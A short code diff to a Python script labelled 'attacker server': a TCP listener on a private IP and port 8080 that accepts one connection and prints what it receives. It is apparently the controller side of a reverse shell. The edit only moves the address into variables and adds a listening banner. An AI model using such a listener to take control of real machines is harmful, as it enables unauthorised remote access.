@@ -1,9 +1,12 @@
 # attacker server
 import socket
 
+ip = "172.25.191.60"
+port = 8080
+
 def connect():
     Mysocket = socket.socket()
-    Mysocket.bind(("172.25.191.60", 8080))
+    Mysocket.bind((ip, port))
     Mysocket.listen(1)
     connection, addres = Mysocket.accept()
     print("Connection established sucessfully", addres)
@@ -19,6 +22,8 @@ def connect():
             print(connection.recv(1024).decode())
 
 def main():
+    print("="*20)
+    print("[+] Listening for incoming TCP connection on port", port)
     connect()
 
 main()
